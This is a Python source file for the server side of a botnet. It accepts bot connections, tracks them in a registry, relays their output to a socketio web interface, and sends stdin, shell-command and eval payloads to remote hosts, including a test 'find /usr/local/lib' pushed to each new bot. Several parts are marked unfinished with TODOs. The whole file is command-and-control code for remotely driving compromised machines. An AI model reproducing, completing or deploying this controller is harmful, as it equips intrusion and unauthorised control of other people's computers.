import time
import json
from threading import Thread, Condition
from threading import Lock
import select

try: from server import formatsock
except: import formatsock


class BotNet(Thread):
    INPUT_TIMEOUT = 1

    def __init__(self, socketio):
        super().__init__()
        self.connlock = Lock()
        self.conncon = Condition(self.connlock)
        self.allConnections = {}
        self.socketio = socketio

    def addConnection(self, user, conn):
        with self.connlock:
            if user in self.allConnections:
                pass # TODO: How to deal with duplicate usernames?
            self.allConnections[user] = conn
            self.conncon.notifyAll()
            # Notify recv thread

    def removeConnection(self, user):
        with self.connlock:
            if user in self.allConnections:
                pass # terminate and remove
            # Notify recv thread

    def getConnection(self,user):
        with self.connlock:
            if user in self.allConnections:
                return self.allConnections[user]
            return None

    # TODO: remove ping? I think sockets naturally will take care if it when using "select"
    def ping(self):
        with self.connlock:
            for bot in self.allConnections.values():
                # recv returns 0 if client disconnected
                # TODO: send packet so that bot.sock.recv doesn't block
                if not bot.sock.rawrecv(1024):
                    # TODO: del is maybe a bit much, we should try to gracefully disconnect if possible
                    # - Sumner
                    del self.allConnections[bot.user]
                    self.socketio.emit('disconnect', {'user': bot.user}, namespace='/bot')
                    print("[-] Lost connection to {}".format(bot.user))

    def getConnections(self):
        with self.connlock:
            return self.allConnections.keys()

    def run(self):
        while True:
            with self.connlock:
                bots = list(self.allConnections.values())
                while len(bots) == 0:
                    self.conncon.wait()
                    bots = list(self.allConnections.values())
            # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
            # TODO maybe use pipe as interrupt instead of timeout?
            rs, _, _ = select.select(bots,[],[],BotNet.INPUT_TIMEOUT)
            # We now have a tuple of all bots that have sent data to the botnet
            for bot in rs:
                user = bot.user
                try:
                    msg = bot.recv()
                    print(msg)
                    # TODO: emit/broadcast this message to anyone on the <user> channel/room
                except IOError:
                    # Connection was interrupted
                    # TODO: inform users
                    self.removeConnection(user)


class BotServer(Thread):
    def __init__(self, tcpsock, botnet, socketio):
        Thread.__init__(self)
        self.tcpsock = tcpsock
        self.botnet = botnet
        self.socketio = socketio

    def run(self):
        while True:
            self.tcpsock.listen(5)
            (clientsock, (ip, port)) = self.tcpsock.accept()
            clientformatsock = formatsock.FormatSocket(clientsock)
            msgbytes = clientformatsock.recv()
            host_info = json.loads(msgbytes.decode('UTF-8'))

            user = host_info['user'].strip()
            print("[+] Received connection from {}".format(user))
            self.botnet.addConnection(user,Bot(clientsock, host_info))

            self.socketio.emit('connection', {'user': user}, namespace='/bot')

            # To test continuous stream, stdout is broken into multiple packets, hangs when waiting
            self.botnet.getConnection(user).sendStdin('find /usr/local/lib\n')

class Bot:
    def __init__(self, sock, host_info):
        self.sock = formatsock.FormatSocket(sock)
        self.arch = host_info['arch'][:-1]
        self.user = host_info['user'][:-1]

    def send(self, cmd, type="stdin"):
        json_str = json.dumps({type:cmd})
        self.sock.send(json_str)

    def sendStdin(self, cmd):
        self.send(cmd, type="stdin")

    def sendCmd(self, cmd):
        self.send(cmd, type="cmd")

    def sendEval(self, cmd):
        self.send(cmd, type="eval")

    def recv(self):
        return self.sock.recv()

    def fileno(self):
        '''
        Returns the OS fileno of the underlying socket, that way the
        OS can wait for IO on the fileno and allow us to serve many bots
        simultaneously
        '''
        return self.sock.fileno()


# TODO: may not be necessary since we're using sockets
# Background thread to check if we've lost any connections
class BotPinger(Thread):
    def __init__(self, botnet):
        super().__init__()
        self.botnet = botnet

    def run(self):
        while True:
            self.botnet.ping()
            time.sleep(60)
